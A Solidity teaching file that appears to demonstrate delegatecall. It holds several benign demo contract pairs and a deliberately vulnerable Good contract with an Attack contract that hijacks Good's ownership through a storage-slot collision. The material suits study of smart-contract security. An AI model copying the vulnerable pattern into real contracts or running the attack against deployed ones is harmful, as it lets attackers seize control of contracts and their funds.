// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract A {
    uint public num;
    address public sender;
    uint public value;

    function setVars(uint _num) public payable {
        num = _num;
        sender = msg.sender;
        value = msg.value;
    } 
}

contract B {
    uint public num;
    address public sender;
    uint public value;

    function setVars(address _contract, uint _num) public payable {
       (bool success, bytes memory data) = _contract.delegatecall(
            abi.encodeWithSignature("setVars(uint256)", _num)
        );
        require(success, "failed to send ether");
    }
}


contract Student {
    uint public mySum;
    address public studentAddr;

    function addTwoNums(address _calculator, uint a, uint b) public returns (uint) {
        (bool success, bytes memory result) = _calculator.delegatecall(abi.encodeWithSignature("add(uint256,uint256)", a, b));
        require(success, "failed-transaction");
        return abi.decode(result, (uint));
    }
}

contract Calculator {
    uint public result;
    address public user;

    function add(uint a, uint b) public returns (uint) {
        result = a + b;
        user = msg.sender;
        return result;
    }
}

// .................................................

contract Good {
    address public helper;
    address public owner;
    uint public num;

    constructor(address _helper) {
        helper = _helper;
        owner = msg.sender;
    }

    function setNum(uint _num) public {
        helper.delegatecall(abi.encodeWithSignature("setNum(uint256)", _num));
    }
}

contract Helper {
    uint public num;

    function setNum(uint _num) public {
        num = _num;
    }
}

contract Attack {
    address public helper;
    address public owner;
    uint public num;

    Good public good;

    constructor(Good _good) {
        good = Good(_good);
    }

    function setNum(uint _num ) public {
        owner = msg.sender;
    }

    function attack() public {
        good.setNum(uint(uint160(address(this))));
        good.setNum(1);
    }
}

contract Greeting {
    string public greet;
    function greeting(address helper) public returns (string memory) {
        (bool success, bytes memory result) = helper.delegatecall(abi.encodeWithSignature("getGreeting()"));
        require(success, "failed!");
        return abi.decode(result, (string));
    }
}

contract Helpers {
    string public greeting = "Hello";

    function getGreeting() public view returns (string memory) {
        return greeting;
    }
}
